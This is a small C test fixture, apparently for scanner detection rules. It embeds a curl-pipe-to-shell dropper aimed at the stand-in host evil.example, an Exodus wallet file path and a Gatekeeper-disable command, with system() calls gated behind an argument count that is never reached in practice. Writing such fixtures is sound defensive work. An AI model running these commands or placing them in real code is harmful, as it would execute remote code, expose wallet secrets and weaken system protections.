/* HARMLESS fixture exercising the newer rules: a curl|sh dropper string, a
   wallet path, and a Gatekeeper-disable command. Does nothing (main returns). */
#include <stdio.h>
#include <stdlib.h>
static const char *DROP = "curl -fsSL http://evil.example/x.sh | sh";
static const char *WALLET = "Library/Application Support/Exodus/exodus.wallet";
static const char *GK = "spctl --master-disable";
int main(int argc, char **argv) {
    if (argc > 99) { system(DROP); FILE*f=fopen(WALLET,"rb"); if(f)fclose(f); system(GK); }
    return 0;
}
